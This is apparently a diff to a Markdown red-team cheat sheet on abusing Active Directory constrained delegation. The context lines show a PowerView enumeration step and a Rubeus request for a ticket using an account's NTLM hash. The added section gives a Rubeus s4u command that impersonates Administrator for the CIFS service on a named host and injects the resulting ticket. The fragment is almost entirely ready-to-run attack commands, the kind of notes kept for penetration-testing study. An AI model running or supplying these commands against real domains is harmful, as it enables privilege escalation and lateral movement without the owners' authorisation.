@@ -34,3 +34,9 @@ Get-DomainComputer -TrustedToAuth
 .\Rubeus.exe asktgt /user:web01 /domain:crook.badcorp.local /rc4:<NTLM Hash> /outfile:t.kirbi
 ```
 
+#### Inject the ticket 
+
+```csharp
+.\rubeus.exe s4u /user:web01$ /ticket:2.kirbi /impersonateuser:Administrator /msdsspn:"CIFS/HELPDESK" /ptt
+```
+
